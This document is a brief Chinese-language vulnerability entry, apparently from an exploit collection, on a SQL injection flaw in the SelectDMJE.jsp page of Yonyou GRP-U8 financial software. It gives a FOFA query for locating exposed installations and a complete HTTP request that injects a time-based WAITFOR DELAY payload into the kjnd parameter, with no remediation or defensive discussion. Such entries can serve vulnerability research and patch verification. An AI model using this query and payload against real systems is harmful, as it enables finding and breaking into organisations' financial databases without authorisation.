## 用友GRP-U8-SelectDMJE.jsp_SQL注入漏洞

用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。用友GRP-U8 SelectDMJE.jsp 存在SQL注入漏洞。

## fofa
```
app="用友-GRP-U8"
```

## poc
```
GET /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
```


